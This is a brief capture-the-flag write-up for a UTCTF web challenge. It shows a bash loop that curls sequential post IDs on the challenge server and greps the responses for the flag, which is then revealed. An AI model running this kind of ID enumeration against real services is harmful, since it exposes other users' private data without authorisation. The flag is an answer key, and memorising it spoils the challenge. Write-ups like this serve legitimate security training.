#### Challenge:

I found this cool more private alternative to twitter. [http://web2.utctf.live:5320/](http://web2.utctf.live:5320/)

---

#### Solution:

After trying to submit entry to the service I noticed that my entry was given ID `58` in the URL. So I brute forced all the previous entries for the flag.

```bash
for iter in {1..58};
do
    curl -Ss "http://web2.utctf.live:5320/oink/$iter" | grep utflag;
done;
```

---

<details><summary>FLAG:</summary>

```text
utflag{traversal_bad_dude}
```

</details>
<br/>
